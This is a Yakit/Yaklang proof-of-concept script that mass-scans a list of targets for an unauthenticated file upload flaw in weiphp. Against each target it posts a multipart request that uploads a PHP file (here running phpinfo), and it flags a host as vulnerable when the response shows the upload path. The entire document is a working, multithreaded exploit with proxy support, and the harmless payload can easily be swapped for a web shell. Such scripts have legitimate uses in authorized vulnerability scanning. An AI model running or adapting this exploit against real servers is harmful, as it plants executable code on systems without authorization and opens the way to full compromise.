yakit.AutoInitYakit()
targets = cli.String("targets") 
targets = str.Split(targets, "\n") 
proxy = cli.String("proxy")
threads = cli.Int("threads")
cli.check()

def add_risk(url,token){
    risk.NewRisk(url,risk.title("weiphp文件上传漏洞"),risk.details("文件上传漏洞"),risk.level("high"),risk.token(url+token.path))
}


def POC(opts,url){
    rsp, req, err := poc.HTTP(`
POST {{params(target)}}/index.php?s=%2FHome%2FFile%2Fupload%2Fsession_id%2Fscevs8hub3m5ogla05a421hb42.html HTTP/1.1
Host: {{params(host)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Content-Type: multipart/form-data; boundary=------------------------e37a54d7d5380c9f
Accept-Encoding: gzip

--------------------------e37a54d7d5380c9f
Content-Disposition: form-data; name="download"; filename="882176.php"
Content-Type: application/octet-stream

<?php
phpinfo();

--------------------------e37a54d7d5380c9f--
`, opts...,
)   
    headers, body = poc.Split(rsp)
    result = "path"
    result2 = ".php"
    result3 = "Uploads"
    token = json.loads(string(body))
    if str.Contains(string(body), result)&&str.Contains(string(body), result2)&&str.Contains(string(body), result3){
        yakit.Warn("【+】%s存在漏洞"%url)
        add_risk(url,token)
    }else {
        yakit.Info("【-】%s不存在漏洞"%url)
    }
}

def testlink(url){
    rsp,err = http.Get(url,
    http.timeout(3.0))
    if err == nil{
        if rsp !=""{
        if rsp.StatusCode == 200{
        return true
    } 
    }else {
        yakit.Info("请求%s失败"%url)
    }
    }

}

def go_payload(url){
    urls = str.ParseStringToUrls(url)
    for i=0;i<len(urls);i++{
        if testlink(urls[i]){
            opts = []
            opts = append(opts, poc.params({"target":urls[i],"host":url}))
            if proxy!=""{
                opts = append(opts, poc.proxy(proxy))
            }
            opts = append(opts,poc.timeout(5.0))
            POC(opts,urls[i])
        }
    }
}

def submittask(url){
        swg.Add()
        go fn{
            defer swg.Done()
            go_payload(url)
        }
}

swg = sync.NewSizedWaitGroup(threads)
for _,x = range targets{
    submittask(x) 
}
swg.Wait()
